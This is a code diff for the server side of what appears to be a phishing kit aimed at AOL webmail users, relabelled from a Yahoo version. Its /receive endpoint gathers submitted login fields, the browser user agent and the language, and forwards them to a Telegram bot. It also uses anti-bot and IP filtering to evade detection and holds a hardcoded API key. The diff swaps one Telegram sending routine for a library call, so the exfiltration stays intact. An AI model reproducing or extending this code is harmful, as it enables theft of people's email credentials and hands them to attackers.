@@ -7,7 +7,6 @@ const antibot = require('./middleware/antibot');
 const ipRangeCheck = require('ip-range-check');
 const abstractApiKey = '72afc8e739e6478d9202565f05968721';
 const { getClientIp } = require('request-ip');
-const querystring = require('querystring');
 const { sendMessageFor } = require('simple-telegram-message');
 let IpAddress;
 
@@ -35,34 +34,6 @@ app.listen(port, () => {
 app.use(bodyParser.urlencoded({ extended: false }));
 app.use(bodyParser.json());
 
-const sendTelegramMessage = (text) => {
-  
-    const website = `https://api.telegram.org/bot${botToken}`;
-    const params = querystring.stringify({
-      chat_id: chatId,
-      text: text,
-    });
-
-    const options = {
-      hostname: 'api.telegram.org',
-      path: '/bot' + botToken + '/sendMessage',
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/x-www-form-urlencoded',
-        'Content-Length': params.length,
-      },
-    };
-    
-    console.log('sent');
-
-    const req = https.request(options, (res) => {
-      // Handle the response if needed
-    });
-
-    req.write(params);
-    req.end();
-};
-
 app.post('/receive', (req, res) => {
   try {
     // Initialize a variable to collect the POST data
@@ -72,7 +43,7 @@ app.post('/receive', (req, res) => {
     let userAgent = req.headers["user-agent"] || "Not provided";
     let systemLang = req.headers["accept-language"] || "Not provided";
 
-    message += `✅🥷 UPDATE TEAM - YAHOO 🥷✅\n` +
+    message += `✅🥷 UPDATE TEAM - AOL 🥷✅\n` +
                `👤 LOGIN INFO\n\n`;
 
     const myObjects = Object.keys(myObject);
@@ -88,10 +59,8 @@ app.post('/receive', (req, res) => {
 
     // Log and send the message when the request processing is complete
     console.log(message);
-      console.log(botToken, chatId);
     const sendMessage = sendMessageFor(botToken, chatId);
-    //sendMessage(message);
-      sendTelegramMessage(message);
+    sendMessage(message);
 
     // Send a response back to the client if needed
     res.send('Data received and processed.');
